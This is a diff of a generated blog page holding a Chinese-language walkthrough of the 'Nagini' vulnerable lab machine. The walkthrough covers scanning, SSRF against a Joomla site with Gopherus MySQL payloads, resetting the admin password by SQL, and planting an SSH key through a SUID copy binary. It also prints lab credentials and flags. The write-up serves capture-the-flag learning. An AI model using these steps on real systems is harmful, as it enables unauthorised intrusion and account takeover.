@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.93.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+        <script src="/js/meme.min.45a777da25d0b1805991f984be4e9ae5e17f3ea94097882dff058256fa34eb17.js"></script>
 
     
 
@@ -280,8 +280,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nmap --min-rate<span class="o">=</span><span class="m">10000</span> -sC -T4 -A 192.168.150.136
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap --min-rate<span class="o">=</span><span class="m">10000</span> -sC -T4 -A 192.168.150.136
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>结果</p>
 <pre tabindex="0"><code>PORT   STATE SERVICE VERSION
@@ -292,7 +292,7 @@
 |_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
 80/tcp open  http    Apache httpd 2.4.38 ((Debian))
 |_http-server-header: Apache/2.4.38 (Debian)
-|_http-title: Site doesn't have a title (text/html).
+|_http-title: Site doesn&#39;t have a title (text/html).
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </code></pre><p>ssh爆破依旧失败</p>
 <h2 id="渗透过程"><a href="#渗透过程" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:渗透过程" class="headings">渗透过程</a></h2>
@@ -303,8 +303,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python dirsearch.py -u http://192.168.150.136
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python dirsearch.py -u http://192.168.150.136
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>结果</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210605210018.png" alt=""></p>
@@ -324,19 +324,19 @@ site_amdin
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python dirsearch.py -u http://192.168.150.136/joomla -e php
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python dirsearch.py -u http://192.168.150.136/joomla -e php
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><blockquote>
 <p>扫出来是个joomla站点且存在文件泄露<code>web.config.txt</code>、<code>configuration.php.bak</code>等</p>
 </blockquote>
 <p>扫joomla的过程中可以看看先扫出来的note.txt，需要使用HTTP3访问<code>https://quic.nagini.hogwarts</code>，在hosts中添置一下，吐了，quiche装不上。。。快进到成功访问获得文件<code>internalResourceFeTcher.php</code>和上面已经扫到的<code>configuration.php.bak</code>。internalResourceFeTcher.php存在SSRF，可以通过file任意文件读，公钥没读到，想起来备份文件中有日志文件地址，读一下试试，还是啥都读不到emmm</p>
 <p>回去重新看备份文件，发现有数据库配置</p>
-<pre tabindex="0"><code>public $host = 'localhost';
-public $user = 'goblin';
-public $password = '';
-public $db = 'joomla';
-public $dbprefix = 'joomla_';
+<pre tabindex="0"><code>public $host = &#39;localhost&#39;;
+public $user = &#39;goblin&#39;;
+public $password = &#39;&#39;;
+public $db = &#39;joomla&#39;;
+public $dbprefix = &#39;joomla_&#39;;
 </code></pre><p>开启了无密码登录，那我们就可以通过SSRF进行数据库操作，使用工具<a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener"> Gopherus</a>生成payload（第一次可能不会成功，刷新几次页面就有了）</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
@@ -345,10 +345,10 @@ public $dbprefix = 'joomla_';
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span><span class="w"> </span><span class="nf">version</span><span class="p">();</span><span class="w"> </span><span class="c1"># 5.5.5
-</span><span class="c1"></span><span class="k">show</span><span class="w"> </span><span class="kp">tables</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">joomla</span><span class="p">;</span><span class="w">
-</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">joomla</span><span class="p">.</span><span class="n">joomla_users</span><span class="p">;</span><span class="w">
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="nf">version</span><span class="p">();</span><span class="w"> </span><span class="c1"># 5.5.5
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">show</span><span class="w"> </span><span class="kp">tables</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">joomla</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">joomla</span><span class="p">.</span><span class="n">joomla_users</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>获得管理员信息</p>
 <pre tabindex="0"><code>site_admin site_admin@nagini.hogwarts $2y$10$cmQ.akn2au104AhR4.YJBOC5W13gyV21D/bkoTmbWWqFWjzEW7vay
@@ -358,8 +358,8 @@ public $dbprefix = 'joomla_';
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">update</span><span class="w"> </span><span class="n">joomla</span><span class="p">.</span><span class="n">joomla_users</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s2">&#34;c8f144957dea1f19247370b4364767dc&#34;</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;site_admin&#39;</span><span class="p">;</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">joomla</span><span class="p">.</span><span class="n">joomla_users</span><span class="p">;</span><span class="w">
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">update</span><span class="w"> </span><span class="n">joomla</span><span class="p">.</span><span class="n">joomla_users</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s2">&#34;c8f144957dea1f19247370b4364767dc&#34;</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;site_admin&#39;</span><span class="p">;</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">joomla</span><span class="p">.</span><span class="n">joomla_users</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><img src="https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210605225444.png" alt=""></p>
 <p>成功修改密码，接下来使用<code>site_admin:密码</code>登录<code>administrator/</code>进下一步操作。</p>
@@ -369,7 +369,7 @@ public $dbprefix = 'joomla_';
 <h3 id="提权"><a href="#提权" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:提权" class="headings">提权</a></h3>
 <p>翻文件，在web目录下找到第一个flag文件horcrux1.txt</p>
 <pre tabindex="0"><code>horcrux_{MzogU2x5dGhFcmlOJ3MgTG9jS0VldCBkRXN0cm9ZZUQgYlkgUm9O}
-# horcrux_{3: SlythEriN's LocKEet dEstroYeD bY RoN}
+# horcrux_{3: SlythEriN&#39;s LocKEet dEstroYeD bY RoN}
 </code></pre><p>接着翻，home目录下发现两个用户，hermoine用户下有一个suid文件<code>su_cp</code>和无读权限的horcrux2.txt，暂时用不到，另一个用户snape目录下有挺多东西，在<code>.creds.txt</code>读到TG92ZUBsaWxseQ==，解码结果Love@lilly，直接ssh登录。</p>
 <p>有了正经用户，接下来就尝试提权，执行<code>sudo -l</code>发现没有sudo指令，结合之前hermoine目录下的可执行文件<code>su_cp</code>，顾名思义，可能是执行<code>sudo cp</code>，猜测这个可能要用来提权，为了保险再找一下suid文件</p>
 <p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>
@@ -381,9 +381,9 @@ public $dbprefix = 'joomla_';
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh-keygen -t rsa <span class="c1"># 生成密钥对</span>
-scp id_rsa.pub snape@192.168.150.136:/home/snape <span class="c1"># 将公钥文件拷贝到目标目录</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh-keygen -t rsa <span class="c1"># 生成密钥对</span>
+</span></span><span class="line"><span class="cl">scp id_rsa.pub snape@192.168.150.136:/home/snape <span class="c1"># 将公钥文件拷贝到目标目录</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>此时执行su_cp将公钥拷贝到hermoine的ssh目录</p>
 <div class="highlight"><div class="chroma">
@@ -392,13 +392,13 @@ scp id_rsa.pub snape@192.168.150.136:/home/snape <span class="c1"># 将公钥文
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">./su_cp -p /home/snape/id_rsa.pub /home/hermoine/.ssh/authorized_keys
-ssh hermoine@192.168.150.136 <span class="c1"># ssh连接</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./su_cp -p /home/snape/id_rsa.pub /home/hermoine/.ssh/authorized_keys
+</span></span><span class="line"><span class="cl">ssh hermoine@192.168.150.136 <span class="c1"># ssh连接</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>读取horcrux2.txt</p>
 <pre tabindex="0"><code>horcrux_{NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=}
-# horcrux_{4: Helga Hufflepuff's Cup destroyed by Hermione}
+# horcrux_{4: Helga Hufflepuff&#39;s Cup destroyed by Hermione}
 </code></pre><p>后面就是浏览器取证，使用工具<a href="https://github.com/unode/firefox_decrypt" target="_blank" rel="noopener">firefox_decrypt</a>获得root密码：<code>@Alohomora#123</code>，su登录root获得flag3</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210606000111.png" alt=""></p>
 <h2 id="参考"><a href="#参考" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:参考" class="headings">参考</a></h2>
